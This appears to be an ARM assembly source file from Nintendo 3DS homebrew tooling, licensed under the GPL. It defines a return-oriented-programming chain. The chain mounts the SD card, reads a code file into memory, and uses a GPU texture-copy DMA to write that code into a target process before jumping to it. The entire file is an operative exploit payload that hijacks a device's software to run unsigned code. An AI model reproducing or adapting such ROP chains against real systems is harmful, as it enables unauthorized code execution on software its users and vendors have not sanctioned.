/*
 * Copyright (C) 2015 173210 <root.3.173210@live.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * This code is based on LoadCode.S in Spider3DSTools by Yifan Lu.
 */

	.arch armv6k
	.align	2

BUFFER_LOC = 0x18410000
CODE_SIZE = 0x00004000

@---------------------------------------------------------------------------------
	.section .rodata.rop
_start:
	.word gPop_r0_pc	@ pop {r0, pc}
	.word s_dmc	@ r0: "dmc:"

	.word gFS_MountSdmc	@ pc: bl FS_MountSdmc; pop {r3-r5, pc}
	.word 0x00200020	@ r3
	.word 0x00200020	@ r4
	.word 0x00200020	@ r5

	.word gPop_r0__r4_pc	@ pc: pop {r0-r4, pc}
	.word 0x08F10000	@ r0: File handle
	.word path	@ r1
	.word 0x00000001	@ r2: Permission
	.word 0x00200020	@ r3
	.word 0x00200020	@ r4

	.word gIFile_Open	@ pc: bl IFile_Open; pop {r4-r7, pc}
	.word 0x00200020	@ r4
	.word 0x00200020	@ r5
	.word 0x00200020	@ r6
	.word 0x00200020	@ r7

	.word gPop_r0__r4_pc	@ pc: pop {r0-r4, pc}
	.word 0x08F10000	@ r0: File handle
	.word 0x08F10020	@ r1: Address to store the size of bytes read
	.word BUFFER_LOC	@ r2
	.word CODE_SIZE	@ r3: size
	.word 0x00200020	@ r4

	.word gIFile_Read	@ pc: bl IFile_Read; pop {r4-r9, pc}
	.word 0x00200020	@ r4
	.word 0x00200020	@ r5
	.word 0x00200020	@ r6
	.word 0x00200020	@ r7
	.word 0x00200020	@ r8
	.word 0x00200020	@ r9

	.word gPop_r0__r4_pc	@ pc: pop {r0-r4, pc}
	.word hGsp	@ r0: GSP handle
	.word 0xFFFF8001	@ r1: kProcess handle
	.word BUFFER_LOC	@ r2
	.word CODE_SIZE	@ r3
	.word 0x00200020	@ r4

	.word gPop_lr_pc	@ pc: pop {lr, pc}
	.word gPop_r0_pc	@ lr: pop {r0, pc}
	.word fGSPGPU_FlushDataCache	@ pc
	.word nn__gxlow__CTR__detail__GetInterruptReceiver	@ r0

	.word gPop_r1_pc	@ pc: pop {r1, pc}
	.word gxCommand	@ r1

	.word gPop_lr_pc	@ pc: pop {lr, pc}
	.word gPop_r0_pc	@ lr: pop {r0, pc}
	.word f_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue	@ pc
	.word 1073741824	@ r0: Time for sleep in microseconds

	.word gPop_r1_pc	@ pc: pop {r1, pc}
	.word 0x00000000	@ r1

	.word gPop_lr_pc	@ pc: pop {lr, pc}
	.word 0x9D2000	@ lr: Destination virtual address
	.word fSvcSleepThread	@ pc: svc #10; bx lr

gxCommand:
	.word 0x00000004	@ Command header (SetTextureCopy)
	.word BUFFER_LOC
	.word dstPa
	.word CODE_SIZE
	.word 0xFFFFFFFF	@ Dim in
	.word 0xFFFFFFFF	@ Dim out
	.word 0x00000008	@ Flags
	.word 0x00000000	@ Unused

	.section .rodata.init
	.word _start+0x8C, 0, 0, 0, 0, 0
	.word 0, 0, 0, 0, 0, 0, 0, _start, gPop_pc, gPop_pc, 0, 0, 0, 0, 0, 0
	.word 0, 0, 0, gPop_r0_pc, _start+0x218, 0, 0, gPop_pc, 0, 0, 0, 0, 0, 0, 0, 0
	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
Self:
	.word Self, gPop_pc, 0, 0, 0, 0, 0, 0, 0, unk
